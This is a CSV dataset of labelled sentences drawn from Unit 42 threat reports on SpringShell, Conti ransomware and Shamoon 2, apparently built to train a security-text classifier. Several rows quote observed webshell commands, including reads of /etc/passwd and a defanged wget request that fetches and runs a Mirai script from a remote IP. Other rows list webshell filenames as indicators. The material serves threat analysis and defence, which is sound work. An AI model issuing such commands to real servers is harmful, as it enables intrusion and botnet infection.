,text,label,word_count,char_length,tokenize_text
2422," Once we deployed the Threat Prevention signatures, we analyzed the packet captures associated with our ""Spring Core Remote Code Execution Vulnerability"" signature and found that a majority of the activity was likely generated by variations of the publicly available PoC tools.",vulnerability,41,277,deployed threat prevention signature analyzed packet capture associated spring core remote code execution vulnerability signature found majority activity likely generated variation publicly available poc tool
2423,Our analysis shows that the following filenames would store the webshell contents on the server in the event of successful exploitation:  0xd0m7.jsp myshell.jsp shell.jsp tomcatwar.jsp wpz.jsp  The webshell contents written to these files are very similar to the code included in the publicly available PoC as well.,FILEPATH,47,315,analysis show following filename would store webshell content server event successful exploitation xdmjsp myshelljsp shelljsp tomcatwarjsp wpzjsp webshell content written file similar code included publicly available poc well
2424,There are two variants of the webshell.,safe,7,39,two variant webshell
2425,One was included in the PoC and uses the pwd parameter for authentication (password is always j) and the cmd parameter for the command to execute.,safe,26,146,one included poc us pwd parameter authentication password always j cmd parameter command execute
2426,The second variant does not use a parameter for authentication and uses id for the command to execute.,safe,18,102,second variant use parameter authentication us id command execute
2427,Table 1 shows the parameters that the webshell saved to the server would use for authentication and command and how many times we saw them.,safe,25,139,table show parameter webshell saved server would use authentication command many time saw
2428," Table 1. Parameters used by webshells seen in hits on ""Spring Core Remote Code Execution Vulnerability"" signature.",vulnerability,17,115,table parameter used webshells seen hit spring core remote code execution vulnerability signature
2429," We searched our telemetry for activity to webshells using the file names associated with the SpringShell activity, with the noted exception of shell.jsp, which is far too general.",FILEPATH,28,180,searched telemetry activity webshells using file name associated springshell activity noted exception shelljsp far general
2430,We have seen the unique commands listed below submitted to webshells.,attack-pattern,11,69,seen unique command listed submitted webshells
2431,"Of these, only the two commands involving /etc/passwd would possibly suggest malicious intent for exploitation – the rest of the commands suggest general scanning activity.",FILEPATH,25,172,two command involving etcpasswd would possibly suggest malicious intent exploitation rest command suggest general scanning activity
2432,ls nslookup%20[redacted].test6.ggdd[.]co[.]uk nslookup+[redacted].test6.ggdd[.]co[.]uk ping%20[redacted].test6.ggdd[.]co[.]uk ping+[redacted].test6.ggdd[.]co[.]uk whoami cat%20/etc/passwd cat+/etc/passwd id ifconfig ipconfig ping%20[redacted].burpcollaborator[.]net  ,FILEPATH,12,267,
2433,Our Spring Core Remote Code Execution Vulnerability signature was released in the early hours of March 31.,vulnerability,17,106,spring core remote code execution vulnerability signature released early hour march
2434,"On April 7, we collected the seven days’ worth of activity since the signature release and found that the signature had triggered 43,092 times.",TIME,24,143,april collected seven day worth activity since signature release found signature triggered time
2435,"Figure 12 shows the steady increase of total hits from March 31 until April 3, a fairly significant decrease on April 4, followed by an incline in activity on April 5 and 6.",TIME,33,173,figure show steady increase total hit march april fairly significant decrease april followed incline activity april
2436,"At this time, we have yet to confirm any successful exploitation attempts that led to a webshell installed onto the server outside of testing activity using purposefully vulnerable applications.",safe,29,194,time yet confirm successful exploitation attempt led webshell installed onto server outside testing activity using purposefully vulnerable application
2437," We observed a large amount of unique IP addresses during our analysis – with 2,056 addresses triggering the Spring Core Remote Code Execution Vulnerability signature.",vulnerability,25,167,observed large amount unique ip address analysis address triggering spring core remote code execution vulnerability signature
2438,"Table 2 shows the top 15 IP addresses seen as the source that triggered our signature, which accounts for just over 50% of all of the activity we observed.",safe,29,155,table show top ip address seen source triggered signature account activity observed
2439, Table 2. Top 15 source IPs triggering the Spring Core Remote Code Execution Vulnerability signature.,vulnerability,15,101,table top source ip triggering spring core remote code execution vulnerability signature
2440," We were able to analyze 31,953 packet captures that triggered the Spring Core Remote Code Execution Vulnerability signature to determine the webshell filenames and the webshell contents that would be saved to the server in the event of successful exploitation.",vulnerability,40,261,able analyze packet capture triggered spring core remote code execution vulnerability signature determine webshell filename webshell content would saved server event successful exploitation
2441,"In many cases, the webshell file names had .jsp extensions, which would allow for a successful exploitation to install a working webshell.",attack-pattern,22,138,many case webshell file name jsp extension would allow successful exploitation install working webshell
2442,"However, in many cases the filename had an extension that would not support a webshell, such as .js and .txt, which we believe was used just to mark the presence of a successful file upload as part of vulnerable server discovery efforts.",safe,42,237,however many case filename extension would support webshell j txt believe used mark presence successful file upload part vulnerable server discovery effort
2443,"At the time of writing, we have observed 95 unique webshell filenames, which we have included in the indicators section.",safe,20,120,time writing observed unique webshell filename included indicator section
2444,"  A majority of the activity used the tomcarwar.jsp filename that was used in the initial PoC script, which accounted for over 57% of the filenames observed.",safe,26,157,majority activity used tomcarwarjsp filename used initial poc script accounted filename observed
2445,"In fact, the top three filenames – tomcarwar.jsp, checkexploit.jsp and javatestfila.jsp – account for over 84% of the activity with known webshell filenames.",FILEPATH,23,157,fact top three filename tomcarwarjsp checkexploitjsp javatestfilajsp account activity known webshell filename
2446,The pie chart in Figure 13 shows a high-level breakdown of the most common filenames.,safe,15,85,pie chart figure show highlevel breakdown common filename
2447," A majority of the packets we analyzed showed the webshell contents did not differ far from the webshell seen in the original proof-of-concept script, which can be seen in Figure 14.",safe,31,182,majority packet analyzed showed webshell content differ far webshell seen original proofofconcept script seen figure
2448,"Another very common webshell seen within our telemetry is the exact same with different HTTP parameters and values used by the webshell, as seen in Figure 15.",attack-pattern,27,158,another common webshell seen within telemetry exact different http parameter value used webshell seen figure
2449,  We also observed a significant amount of exploit attempts using content that again was a modification of the initial webshell in the proof-of-concept.,attack-pattern,23,152,also observed significant amount exploit attempt using content modification initial webshell proofofconcept
2450,"Figure 16 shows the contents that we observed in the wild, which should not be considered a webshell as it does nothing more than display SPRING_CORE_RCE.",attack-pattern,26,154,figure show content observed wild considered webshell nothing display spring_core_rce
2451,The lack of webshell functionality suggests that this is likely uploaded by scanners attempting to discover servers vulnerable to SpringShell.,attack-pattern,20,142,lack webshell functionality suggests likely uploaded scanner attempting discover server vulnerable springshell
2452," More recently, we have seen an uptick in webshell content as seen in Figure 17, which is related to another proof-of-concept script created by K3rwin.",identity,25,151,recently seen uptick webshell content seen figure related another proofofconcept script created krwin
2453,This particular webshell will load a base64 encoded class that will contain the functionality desired by the actor.,safe,18,115,particular webshell load base encoded class contain functionality desired actor
2454,"This particular webshell is based on AntSword’s shell.jsp, which was modified to use a parameter of k3rwin instead of ant to load the class.",tools,24,140,particular webshell based antswords shelljsp modified use parameter krwin instead ant load class
2455, The only malicious activity we have seen in our telemetry related to SpringShell involves HTTP requests to URLs containing the tomcatwar.jsp filename associated with the SpringShell proof-of-concept script.,vulnerability,28,207,malicious activity seen telemetry related springshell involves http request url containing tomcatwarjsp filename associated springshell proofofconcept script
2456,The activity involved parameters issued to the webshell that would run a command to download and execute a script from a remote server as seen in the following:  [redacted IPV4 address]:8080/tomcatwar.jsp?pwd=j&cmd=/bin/sh/-c${IFS}'cd${IFS}/tmp;wget${IFS}hxxp://107.174.133[.]167/t.sh${IFS}-O-%a6sh${IFS}SpringCore;'  ,URL,31,318,activity involved parameter issued webshell would run command download execute script remote server seen following redacted ipv addresstomcatwarjsppwdjcmdbinshcifscdifstmpwgetifshxxptshifsoashifsspringcore
2457,"Upon further analysis, the t.sh script hosted on this remote server is related to the Mirai botnet.",FILEPATH,17,99,upon analysis tsh script hosted remote server related mirai botnet
2458,"The requests above were sent from the IP address ​​194.31.98[.]186, which itself has hosted payloads associated with Mirai as well.",IPV4,20,131,request sent ip address hosted payload associated mirai well
2459,Inbound attempts to exploit the SpringShell vulnerability from 194.31.98[.]186 attempted to install the webshell from the original proof-of-concept seen in Figure 14.,IPV4,22,166,inbound attempt exploit springshell vulnerability attempted install webshell original proofofconcept seen figure
2460,Our signatures blocked the initial attempt to exploit the vulnerability so we cannot confirm if Mirai’s attempts to exploit SpringShell have been successful.,malware,23,157,signature blocked initial attempt exploit vulnerability confirm mirais attempt exploit springshell successful
2461,Both Netlab 360 and Trend Micro also observed Mirai activity related to the SpringShell vulnerability.,identity,15,102,netlab trend micro also observed mirai activity related springshell vulnerability
2462,"In addition to our threat prevention signatures, we analyzed the alerts triggered in Cortex XDR and found 116 events between April 4 and April 8.",SOFTWARE,25,145,addition threat prevention signature analyzed alert triggered cortex xdr found event april april
2463,A majority of these alerts are triggered by testing of the proof-of-concept tools previously mentioned above.,safe,16,109,majority alert triggered testing proofofconcept tool previously mentioned
2464,"We also observed several alerts involving a docker container named spring4shell, which had a /helloworld directory and had a listening port tcp/8080.",vulnerability,22,149,also observed several alert involving docker container named springshell helloworld directory listening port tcp
2465,"We believe these docker containers are also part of internal testing efforts using publicly available docker containers, such as Spring4Shell-POC.",vulnerability,20,146,believe docker container also part internal testing effort using publicly available docker container springshellpoc
2466,"The signature triggered on the creation of the webshell files, of which we observed the following file written:  /usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/shell_jsp.java /usr/local/tomcat/webapps/ROOT/shell_.jsp  SpringShell is officially assigned CVE-2022-22965, and the patch was released on March 31, 2022.",FILEPATH,34,329,signature triggered creation webshell file observed following file written usrlocaltomcatworkcatalinalocalhostrootorgapachejspshell_jspjava usrlocaltomcatwebappsrootshell_jsp springshell officially assigned cve patch released march
2467,"Since exploitation is straightforward and all the relevant technical details have already gone viral on the internet, it’s possible that SpringShell will become fully weaponized and abused on a larger scale.",vulnerability,31,207,since exploitation straightforward relevant technical detail already gone viral internet possible springshell become fully weaponized abused larger scale
2468,Developers and users who have projects or products based on JDK9+ and the Spring Framework (or its derivatives) are strongly urged to patch as soon as possible.,SOFTWARE,27,160,developer user project product based jdk spring framework derivative strongly urged patch soon possible
2469," While CVE-2022-22963 is a different vulnerability in Spring Cloud Function (not technically part of SpringShell), a Threat Prevention signature is also available to ensure coverage at the perimeter.",vulnerability,28,199,cve different vulnerability spring cloud function technically part springshell threat prevention signature also available ensure coverage perimeter
2470,Unit 42 researchers are proactively monitoring info related to other recently disclosed Spring vulnerabilities and will proceed to provide coverage as soon as more info has become available.,identity,28,190,unit researcher proactively monitoring info related recently disclosed spring vulnerability proceed provide coverage soon info become available
2471, Unit 42 is actively monitoring malicious traffic through our devices and cloud solutions.,identity,13,90,unit actively monitoring malicious traffic device cloud solution
2472, The Palo Alto Networks Product Security Assurance team is evaluating CVE-2022-22963 and CVE-2022-22965 as relates to Palo Alto Networks products and currently assigns this a severity of none.,identity,28,192,palo alto network product security assurance team evaluating cve cve relates palo alto network product currently assigns severity none
2473, Palo Alto Networks Next-Generation Firewall with a Threat Prevention subscription can block the attack traffic related to this vulnerability.  Palo Alto Networks Prisma Cloud can detect the presence of both CVE-2022-22965 and CVE-2022-22963 across all Compute environments.,vulnerability,37,274,palo alto network nextgeneration firewall threat prevention subscription block attack traffic related vulnerability palo alto network prisma cloud detect presence cve cve across compute environment
2474,"Palo Alto Networks Cortex XDR Prevent and Pro customers running agent version 7.4 and above with content version 450-87751 on Linux devices are protected from CVE-2022-22963 using the Java Deserialization module; customers running agent version 7.7 and content 480 and above are protected from CVE-2022-22963 and CVE-2022-22965 for both Windows and Linux using the Java Deserialization module; other OSes and exploits receive protections from post-exploitation activities using Behavioral Threat Protection, Password Theft Prevention, Anti Ransomware and other Anti Exploitation modules.",vulnerability,80,587,palo alto network cortex xdr prevent pro customer running agent version content version linux device protected cve using java deserialization module customer running agent version content protected cve cve window linux using java deserialization module os exploit receive protection postexploitation activity using behavioral threat protection password theft prevention anti ransomware anti exploitation module
2475,Cortex XDR Pro customers also have visibility into post-exploitation activities and can specifically track the “Process execution with a suspicious command line indicative of the Spring4Shell exploit” and “Suspicious HTTP Request to a vulnerable Java class” Analytics BIOCs.,vulnerability,38,274,cortex xdr pro customer also visibility postexploitation activity specifically track process execution suspicious command line indicative springshell exploit suspicious http request vulnerable java class analytics biocs
2476,"Furthermore, customers can create a BIOC from an XQL query looking for the dropped webshell IoCs to detect exploitation attempts in their environments.",attack-pattern,23,151,furthermore customer create bioc xql query looking dropped webshell iocs detect exploitation attempt environment
2477," Palo Alto Networks Cortex XSOAR customers can leverage the ""Spring Core and Cloud Function SpEL RCEs"" pack to automatically detect and mitigate the vulnerabilities.",vulnerability,24,165,palo alto network cortex xsoar customer leverage spring core cloud function spel rces pack automatically detect mitigate vulnerability
2478,Read more on the XSOAR marketplace.,SOFTWARE,6,35,read xsoar marketplace
2479,"Prisma Cloud Mitigations for SpringShell and Recent Spring Vulnerabilities: CVE-2022-22963, CVE-2022-22965 How Cortex XDR Blocks SpringShell Exploits  0808a56a90ca2f8b1e91a1e60b7b451e.txt 0c901fefcae46ba984225aa72df0825c.txt 1532b681733b6bce2ff7252d8890d550.txt 28fcea06661f13ebe9c87327f949f3a8.txt 2b98432e352ff74569b81099dd5ee246.txt 4acbedbe977480d19b7b682d4878cae2.txt 4fdd6fbd220e26b63a7c9a5aa88f5f31.txt 5657e4634210a3d47a789d1389a89320.txt 646bbc2c112070c26b3c042e81c6947e.txt 70b98d30e383df910ce3d693603404fb.txt 73be7d1ef52c3dbc9a5d726288d8a4ba.txt 83d81ef47f0e9a205fb66a100f3179bf.txt 8592f3e430720d324d7cfd7ecd1de521.txt 8697f146477832389449cf2548032ca7.txt Shell.jsp UJaez.jsp Y4kws.jsp a6bfc76094f689dab978f059ea2456a1.txt aniwvzgvwqnwtehgsfsgbslwoiqkjk.jsp appli12 baf24e5f9fc18cf58172d1ba745f0f7a.txt c41fc8f359d1658559c2d1c0043c76fb.txt cbsewlaeqsdsqktavziakyzsuwfciu.jsp czbwzitpzjzkcvkrirybzihsibmuej.jsp czpdnhpraxgzrtatiuigsalfedwwit.jsp dnuurzjtlbjrnuukwdmaltqrqqlaig.jsp duvdqpoyrcapqbfcetgwsqxfkslubw.jsp ee947d98b91c8ada08f8c15e8f3248fc.txt efdde87c66fe4e6dc73a2ab6111ca58a.txt facb4be5385617bf11e6d67f0aa0203b.txt ggoibjvztvlpelaghjzeweqmopjosz.jsp goocmasqxwfufyxrgyachwidxdotkh.jsp hlbpgpqsyracfnvkgrgvlhcptpmdfn.jsp hmmyitbecwhmrdicykmfvqlcsknbff.jsp hnmqeuzumlokxuhqyekeetrgougeof.jsp ilvckpgzbrcdljyqdfhqendqcwhgxp.jsp izodfyvqujwztweclykgozahdlqvqp.jsp jynrrkjghebemkrhvfzllrepzosinb.jsp kqbnngrfnsxlreajyknuimoamysvwt.jsp ltcovlwqkckjpuzbqzbjdpkgkakvno.jsp mhoqqvpuxdqtuqzmwdrvdeayqvlygb.jsp osanxuadyvjaiorcjfqnckfpewunnt.jsp ptipfhjosfvrfwndwqccapozcbasge.jsp pxwcqxzrstepmbwufjxuaydkwgmvds.jsp qnzfvqpeiljtoyvrywrkuvkrmuewzn.jsp rQFlA.jsp rmdwahilztwhhqnmcbodkgtbnmrhjx.jsp tomcat74935.jsp ubekdurthzexowlohzgienbwvexynd.jsp ufoubgkazumxhqvwlnyfejnmyqofcm.jsp ujpmauuhltvsokjracgwkbflkhhnwo.jsp vkmckfvljtpbyowxwhgbjsvyktfdiq.jsp xcoihpiouaamtnbqqvcvffyxyrokvn.jsp yjjhhdlxepozhirznemjabnsciycvv.jsp yutugdqbrossntwaujgxwgrpgczkbd.jsp zawpiupzzsjexllfbicrgvlcuxzqyb.jsp zqgwtzyrexctiyvsawmwttncwzoyyd.jsp zuvuegtemzfsyqjfykowggxpqkuqdp.jsp 0xd0m7.jsp crashed_log_",FILEPATH,77,2098,
2480,gdGCT.jsp,FILEPATH,1,9,gdgctjsp
2481,myshell.jsp,FILEPATH,1,11,myshelljsp
2482,rakesh.jsp,FILEPATH,1,10,
2483,shei1.jsp,FILEPATH,1,9,
2484,shell13.jsp,FILEPATH,1,11,shelljsp
2485,tomcatlogin.jsp,FILEPATH,1,15,
2486,data_theorem_spring4shell_scan.txt,FILEPATH,1,34,data_theorem_springshell_scantxt
2487,jarom_h1.jsp,FILEPATH,1,12,
2488,"jquery123123123cssbackup7331.jsp tomjj.jsp test1.jsp hackerone0x.jsp inject.jsp poc4bugb.jsp curiositysec.jsp mynameis0bsecure.jsp tomcatwa.jsp ahmed.txt testqqsg.jsp wpz.jsp lelel.jsp shell.jsp 07935fdf05b66.jsp vulntest-12345.txt jquerycssv2.js poc.jsp tomcatspring.jsp ofc.jsp lalalalal.jsp safetytest.txt log.txt safetytest javatestfila.jsp checkexploit.jsp tomcatwar.jsp  Updated April 19, 2022, at 7:30 a.m. PT.   Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!  Please mark, I'm not a robot!  By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",FILEPATH,76,664,jquerycssbackupjsp tomjjjsp testjsp hackeronexjsp injectjsp pocbugbjsp curiositysecjsp mynameisbsecurejsp tomcatwajsp ahmedtxt testqqsgjsp wpzjsp leleljsp shelljsp fdfbjsp vulntesttxt jquerycssvjs pocjsp tomcatspringjsp ofcjsp lalalalaljsp safetytesttxt logtxt safetytest javatestfilajsp checkexploitjsp tomcatwarjsp updated april pt sign receive latest news cyber threat intelligence research u please enter email address please mark im robot submitting form agree term use acknowledge privacy statement
2489,This post is also available in:      日本語 (Japanese)  Conti ransomware stands out as one of the most ruthless of the dozens of ransomware gangs that we follow.,threat-actor,27,158,post also available 日本語 japanese conti ransomware stand one ruthless dozen ransomware gang follow
2490,"The group has spent more than a year attacking organizations where IT outages can have life-threatening consequences: hospitals, 911 dispatch carriers, emergency medical services and law enforcement agencies.",safe,28,208,group spent year attacking organization outage lifethreatening consequence hospital dispatch carrier emergency medical service law enforcement agency
2491,"Ireland has yet to recover from an attack in mid-May that prompted the shutdown of the entire information technology network of the nation's healthcare system – prompting cancellation of appointments, the shutdown of X-ray systems and delays in COVID testing.",location,40,259,ireland yet recover attack midmay prompted shutdown entire information technology network nation healthcare system prompting cancellation appointment shutdown xray system delay covid testing
2492, Conti also stands out as unreliable.,threat-actor,6,37,conti also stand unreliable
2493,"We've seen the group stiff victims who pay ransoms, expecting to be able to recover their data.",safe,17,95,weve seen group stiff victim pay ransom expecting able recover data
2494," The FBI has connected Conti to more than 400 cyberattacks against organizations worldwide, three-quarters of which are based in the U.S., with demands as high as $25 million.",threat-actor,28,175,fbi connected conti cyberattacks organization worldwide threequarters based u demand high million
2495,This makes Conti one of the greediest groups out there.,threat-actor,10,55,make conti one greediest group
2496," If you think you may have been impacted, please email unit42-investigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42 Incident Response team.",EMAIL,26,177,think may impacted please email unitinvestigationspaloaltonetworkscom call unit get touch unit incident response team
2497, We’ve followed Conti for more than a year through our work helping organizations respond to ransomware attacks.,threat-actor,17,112,weve followed conti year work helping organization respond ransomware attack
2498,It appears to be one of many private cybercrime groups that have set up their operations by leveraging the booming ransomware-as-a-service (RaaS) ecosystem.,safe,23,156,appears one many private cybercrime group set operation leveraging booming ransomwareasaservice raas ecosystem
2499,"Such gangs obtain their foothold in the networks of their victims by purchasing access from other threat actors, who sell it as a commodity.",attack-pattern,24,140,gang obtain foothold network victim purchasing access threat actor sell commodity
2500,"They can also procure infrastructure, malware, communications tools and money laundering from other RaaS providers.",safe,15,115,also procure infrastructure malware communication tool money laundering raas provider
2501,"Most of these actors use the same methods of access found in many ransomware attacks, such as phishing emails and exploiting unprotected internet-facing applications, the lack of multi-factor authentication (MFA), as well as the typical avenues used to preserve and enhance access once it’s achieved, such as through the use of Cobalt Strike or PowerShell.",attack-pattern,55,356,actor use method access found many ransomware attack phishing email exploiting unprotected internetfacing application lack multifactor authentication mfa well typical avenue used preserve enhance access achieved use cobalt strike powershell
2502," These approaches are not particularly clever or sophisticated, but often they are effective.",safe,13,93,approach particularly clever sophisticated often effective
2503,Conti’s methodology often follows the “double extortion” approach that many leading ransomware groups are presently using.,threat-actor,16,122,contis methodology often follows double extortion approach many leading ransomware group presently using
2504,"When using double extortion, attackers will not only lock up a victim’s files and demand ransom, but they will also steal files and threaten to publish them on a website or otherwise leak them if their initial ransom demand is not met.  But Conti’s methods do have atypical elements.",threat-actor,49,283,using double extortion attacker lock victim file demand ransom also steal file threaten publish website otherwise leak initial ransom demand met contis method atypical element
2505," Usually, the more successful ransomware operators put a lot of effort into establishing and maintaining some semblance of “integrity” as a way of facilitating ransom payments from victims.",safe,28,189,usually successful ransomware operator put lot effort establishing maintaining semblance integrity way facilitating ransom payment victim
2506,"They want to establish stellar reputations for “customer service” and for delivering on what they promise – that if you pay a ransom, your files will be decrypted (and they will not appear on a leak website).",safe,37,208,want establish stellar reputation customer service delivering promise pay ransom file decrypted appear leak website
2507,"Yet in our experience helping clients remediate attacks, Conti has not demonstrated any signs that it cares about its reputation with would-be victims.",threat-actor,23,151,yet experience helping client remediate attack conti demonstrated sign care reputation wouldbe victim
2508," In one recent case, Conti did not return a client’s files who had paid the ransom.",threat-actor,16,83,one recent case conti return client file paid ransom
2509,This client got only a small fraction of the file restorations that were promised before the Conti ransomware representatives disappeared back into the dark web.,threat-actor,25,161,client got small fraction file restoration promised conti ransomware representative disappeared back dark web
2510,"In another case, our client needed an inventory of all files accessed, so that they could notify parties whose data was affected.",safe,22,129,another case client needed inventory file accessed could notify party whose data affected
2511,"Conti agreed to share that information if a payment was made, then changed their minds, saying, “We do not own that data anymore.",safe,23,129,conti agreed share information payment made changed mind saying data anymore
2512,It was deleted and there is no chance to restore it.”,safe,11,53,deleted chance restore
2513,"Like many ransomware gangs, Conti is constantly adapting to changes, including recent heightened scrutiny by law enforcement and policy makers following high-profile disruptive attacks on the Colonial pipeline and healthcare organizations.",threat-actor,31,239,like many ransomware gang conti constantly adapting change including recent heightened scrutiny law enforcement policy maker following highprofile disruptive attack colonial pipeline healthcare organization
2514,"When Ireland's healthcare system refused to pay any ransom, Conti provided the agency with what it said was a free decryption key.",location,22,130,ireland healthcare system refused pay ransom conti provided agency said free decryption key
2515,"But there was a twist: The group maintained that it would still make good on its ""double extortion"" threat to publish stolen data on its leak site.",safe,27,147,twist group maintained would still make good double extortion threat publish stolen data leak site
2516," Unfortunately, keeping Conti out of your network often isn’t simple.",threat-actor,10,69,unfortunately keeping conti network often isnt simple
2517,"A primary means of infection appears to be through phishing scams, and attackers are constantly upping their game in this area.",attack-pattern,21,127,primary mean infection appears phishing scam attacker constantly upping game area
2518,"While phishing emails used to be pretty easy for almost anyone to spot, particularly after some awareness training, we are seeing increasingly sophisticated attacks in which the threat actors have done plenty of homework on their intended victims.",attack-pattern,38,247,phishing email used pretty easy almost anyone spot particularly awareness training seeing increasingly sophisticated attack threat actor done plenty homework intended victim
2519,"Sometimes they’ll send a blitz of scam emails to employees throughout an organization, and it takes only one to open the attachment and release the malware into the network.  Ransomware attacks are getting easier to unleash, and the rewards to the attackers are still growing by leaps and bounds.",attack-pattern,49,296,sometimes theyll send blitz scam email employee throughout organization take one open attachment release malware network ransomware attack getting easier unleash reward attacker still growing leap bound
2520,"Accordingly, it continues to be a growth industry that will attract multitudes of new practitioners, and it is likely that high-profile targets will continue to fall.",safe,26,166,accordingly continues growth industry attract multitude new practitioner likely highprofile target continue fall
2521," Palo Alto Networks detects and prevents Conti ransomware in the following ways:  Additionally, Indicators of Compromise (IoCs) associated with Conti are available on GitHub, and have been published to the Unit 42 TAXII feed.",threat-actor,34,225,palo alto network detects prevents conti ransomware following way additionally indicator compromise iocs associated conti available github published unit taxii feed
2522," Exploit Public-Facing Application [T1190], Spearphishing Attachment [T1566.001]  Windows Command Shell [T1059.003], Native API [T1106]  Deobfuscate/Decode Files or Information [T1140], Obfuscated Files or Information [T1027], Dynamic-link Library Injection [T1055.001]  File and Directory Discovery [T1083], Network Share Discovery [T1135], Process Discovery [T1057], System Network Configuration Discovery [T1016], System Network Connections Discovery [T1049]  SMB/Windows Admin Shares [T1021.002], Taint Shared Content [T1080]  Data Encrypted for Impact [T1486], Inhibit System Recovery [T1490], Service Stop [T1489]  Table 1.",attack-pattern,72,629,exploit publicfacing application spearphishing attachment window command shell native api deobfuscatedecode file information obfuscated file information dynamiclink library injection file directory discovery network share discovery process discovery system network configuration discovery system network connection discovery smbwindows admin share taint shared content data encrypted impact inhibit system recovery service stop table
2523,Courses of Action for Conti ransomware.,threat-actor,6,39,course action conti ransomware
2524, †These capabilities are part of the NGFW security subscriptions service.,safe,10,73,capability part ngfw security subscription service
2525, * These analytic detectors will trigger automatically for Cortex XDR Pro customers.,SOFTWARE,12,84,analytic detector trigger automatically cortex xdr pro customer
2529,Unit 42 researchers have been following the Shamoon 2 attacks closely since November 2016.,identity,14,90,unit researcher following shamoon attack closely since november
2530,"To date, Shamoon 2 has unfolded in three separate attack waves on November 11, 2016, November 29, 2016, and January 23, 2017.",TIME,22,125,date shamoon unfolded three separate attack wave november november january
2531," Based on our newest research, we can answer a question that many have had about these attacks: how is Shamoon 2 able to enter an organization’s network and spread so widely?",threat-actor,31,174,based newest research answer question many attack shamoon able enter organization network spread widely
2532,The answer is simple: credential theft.,attack-pattern,6,39,answer simple credential theft
2533, Credential theft has been known to be a key part of the Shamoon 2 attacks.,attack-pattern,15,75,credential theft known key part shamoon attack
2534,What our research is showing that’s new is how the attackers use the credentials once they’ve breached the network.,safe,19,115,research showing thats new attacker use credential theyve breached network
2535," And from this we can see how credential theft is the keystone of Shamoon 2 attacks; if an organization can prevent credential theft, the Shamoon 2 attacks can’t succeed.",attack-pattern,29,170,see credential theft keystone shamoon attack organization prevent credential theft shamoon attack cant succeed
2536," In our research, we’re able to outline that Shamoon 2 enters and spreads through an organization in three stages:  These stages are outlined in the image below.  And that credential theft is a key element in each stage:  It’s also worth noting that credentials are a keystone issue in Shamoon 2 wave 2 too: we saw evidence of targeting an organization’s virtual desktop infrastructure (VDI) solutions with default credentials.",threat-actor,69,427,research able outline shamoon enters spread organization three stage stage outlined image credential theft key element stage also worth noting credential keystone issue shamoon wave saw evidence targeting organization virtual desktop infrastructure vdi solution default credential
2537,"While not stolen credentials, the effect is the same: attackers can use those credentials to abuse otherwise legitimate access and privileges to carry out their attacks.",safe,26,169,stolen credential effect attacker use credential abuse otherwise legitimate access privilege carry attack
2538," At this time, we do not have research that explains definitively how the Shamoon 2 attackers have obtained these credentials.",threat-actor,20,126,time research explains definitively shamoon attacker obtained credential
2539,"We do believe there is evidence suggestive of a connection between Shamoon 2 and the Magic Hound campaign, which could indicate these two attack campaigns could have worked in conjunction with each other to execute the Shamoon 2 attacks.",campaign,39,237,believe evidence suggestive connection shamoon magic hound campaign could indicate two attack campaign could worked conjunction execute shamoon attack
2540," We also believe the presence of specific, valid named hosts from the network used in Stage 2 shows they were obtained directly from Active Directory on a domain controller.",SOFTWARE,29,173,also believe presence specific valid named host network used stage show obtained directly active directory domain controller
2541,"This is also suggestive of access to the network through legitimate, stolen credentials.",safe,13,88,also suggestive access network legitimate stolen credential
2542,"In one sample we examined, we found a total of 844 hostnames.",safe,12,61,one sample examined found total hostnames
2543," This also helps to set context for how widely Disttrack can attempt to spread: 844 systems, each attempting to spread to 256, means that from one distribution server, Shamoon 2 attackers could potentially try to spread Disttrack to 216,064 systems; and that’s not counting if any of those infected systems, in turn, attempts to spread to an additional 256 systems.",threat-actor,60,365,also help set context widely disttrack attempt spread system attempting spread mean one distribution server shamoon attacker could potentially try spread disttrack system thats counting infected system turn attempt spread additional system
2544, Shamoon 2 attacks are very targeted to a specific region.,threat-actor,10,58,shamoon attack targeted specific region
2545,But it would be a mistake to write-off the threat that Shamoon 2 demonstrates.,threat-actor,14,78,would mistake writeoff threat shamoon demonstrates
2546,"Shamoon 2 attackers are using a rudimentary, but effective, distribution system of their own making.",threat-actor,15,100,shamoon attacker using rudimentary effective distribution system making
2547,The power of their attack doesn’t lie in the tools they use but in their ability to obtain and abuse legitimate credentials.,attack-pattern,22,124,power attack doesnt lie tool use ability obtain abuse legitimate credential
2548, This underscores why credential theft is something that organizations should prioritize as a top threat and take steps to understand it and prevent it.,attack-pattern,24,152,underscore credential theft something organization prioritize top threat take step understand prevent
